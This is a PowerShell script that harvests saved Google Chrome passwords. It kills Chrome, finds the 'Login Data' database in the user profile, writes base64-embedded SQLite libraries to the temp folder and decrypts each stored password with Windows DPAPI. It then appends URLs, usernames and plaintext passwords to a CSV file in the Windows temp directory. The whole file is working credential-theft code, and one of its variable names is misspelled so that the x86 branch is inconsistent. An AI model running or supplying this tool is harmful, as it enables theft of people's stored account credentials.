<#
.Synopsis

  Quickly retrieve Google Chrome passwords using powershell (please note this creates sqlite assemblies in your temp directory)

.PARAMETER Path
  
  The optional path to a non-standard database location for the Google Chrome Login Data database.  Generically found at '<APPDATA>\Local\Google\Chrome\Default\Login Data'

.EXAMPLE

  PS> .\Get-ChromePasswords

  Url                                                                                                    Username                  Password
  ---                                                                                                    --------                  --------
  https://accounts.google.com/signin/challenge/sl/password                                               user1                     password
#>

Param(
    [String]$Path,
    $output = "c:\windows\temp\chr_pass.csv"
)

# is Chrome Running?  If so, kill it.

get-process -erroraction SilentlyContinue -name "chrome" | stop-process 

Push-Location $PSScriptRoot
. .\SQLLibraries.ps1
Pop-Location

if ([String]::IsNullOrEmpty($Path)) {
    # -Force to show hidden files/directories
    $chromePath = (Get-ChildItem -file -Recurse -Path ($env:USERPROFILE) -Force -ErrorAction SilentlyContinue `
        | Where-Object { $_.Basename -eq "Login Data" }).FullName
        foreach ($chrome_instance in $chromePath) { if ($chrome_instance -like "*chrome*") 
        { $Path = "$chrome_instance" } }
}

if (![system.io.file]::Exists($Path))
{
    
    Write-Error 'Chrome db file doesnt exist, or invalid file path specified'
    exit
}

if ([intptr]::Size -eq 8)
{

    $SystemDataSQLiteDLL = $SystemDataSQLiteDLLx64
    $SQLiterInterop = $SQLiterInteropx64

} else {

    $SystemDataSQLiteDLL = $SystemDataSQLiteDLLx86
    $SQLiteInterop = $SQLiterInteropx86

}

Add-Type -AssemblyName System.Security

$SQLitePath = "$([system.io.path]::GetTempPath())System.Data.SQLite.dll"
$SQLiteInteropPath = "$([system.io.path]::GetTempPath())SQLite.Interop.dll"

[system.io.file]::WriteAllBytes(`
    $SQLitePath,
    [System.Convert]::FromBase64String($SystemDataSQLiteDLL)
)

[system.io.file]::WriteAllBytes(
    $SQLiteInteropPath,
    [System.Convert]::FromBase64String($SQLiterInterop)
)

[System.Reflection.Assembly]::LoadFile($SQLitePath) | Out-Null
$conn = New-Object System.Data.Sqlite.SqliteConnection -ArgumentList "Data Source=$Path;"
$conn.Open()

$command = New-Object System.Data.SQLite.SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", $conn)
$reader = $command.ExecuteReader()

while ($reader.Read())
{
    $record = New-Object psobject
$record | select @{N='Url';E={$reader["action_url"]};},
                        @{N='Username';E={$reader["username_value"]};},
                        @{N='Password';`
                            E={
                                [System.Text.Encoding]::Default.GetString(
                                    [System.Security.Cryptography.ProtectedData]::Unprotect(
                                                    $reader["password_value"],
                                                    $null, 
                                                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                                    ) 
                                ) 
                       } 
                  
                         } >> $output
}   
